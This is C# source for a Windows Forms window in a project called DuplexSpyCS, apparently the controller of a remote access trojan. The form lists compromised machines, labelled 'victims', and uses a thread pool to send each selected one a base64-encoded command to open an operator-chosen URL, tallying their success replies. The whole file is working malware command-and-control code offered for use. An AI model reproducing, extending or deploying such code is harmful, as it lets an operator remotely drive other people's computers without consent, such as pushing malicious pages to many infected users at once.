using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmMultiURL : Form
    {
        public frmMain frmMain;
        public List<clsVictim> m_lsVictim;
        private int nCnt = 0;

        public frmMultiURL()
        {
            InitializeComponent();
        }

        void Received(clsTcpListener l, clsVictim v, string[] cmd)
        {
            if (cmd[0] == "exec")
            {
                if (cmd[1] == "url")
                {
                    if (cmd[2] == "open")
                    {
                        int nCode = int.Parse(cmd[3]);
                        UpdateStatus(v, nCode);
                    }
                }
            }
        }

        public void UpdateStatus(clsVictim v, int nCode)
        {
            Invoke(new Action(() =>
            {
                string szID = v.ID;
                ListViewItem item = listView1.FindItemWithText(szID);
                if (item != null && nCode == 1)
                {
                    item.SubItems[1].Text = "OK";
                    nCnt++;

                    if (nCnt == m_lsVictim.Count)
                    {
                        button1.Enabled = true;
                        MessageBox.Show("Action successfully.", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    }
                }
            }));
        }

        void setup()
        {
            if (m_lsVictim == null)
            {
                MessageBox.Show("m_lsVictim is null.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Close();
            }

            foreach (clsVictim v in m_lsVictim)
            {
                ListViewItem item = new ListViewItem(v.ID);
                item.SubItems.Add("?");
                item.Tag = v;
                listView1.Items.Add(item);
            }

            toolStripStatusLabel1.Text = $"Victim[{m_lsVictim.Count}]";

            //frmMain.listener.ReceivedDecoded += Received;
        }

        private void frmMultiURL_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            button1.Enabled = false;
            nCnt = 0;

            int nThd = (int)numericUpDown1.Value;
            string szURL = textBox1.Text;
            ThreadPool.SetMinThreads(1, 1);
            ThreadPool.SetMaxThreads(nThd, nThd);

            foreach (ListViewItem item in listView1.CheckedItems)
            {
                clsVictim v = (clsVictim)item.Tag;
                ThreadPool.QueueUserWorkItem(x =>
                {
                    v.SendCommand($"exec|url|open|" + clsCrypto.b64E2Str(szURL));
                });
            }
        }

        private void frmMultiURL_FormClosed(object sender, FormClosedEventArgs e)
        {
            //frmMain.listener.ReceivedDecoded -= Received;
        }

        //Check All
        private void button2_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.Items)
                item.Checked = true;
        }
        //Uncheck All
        private void button3_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.Items)
                item.Checked = false;
        }
    }
}
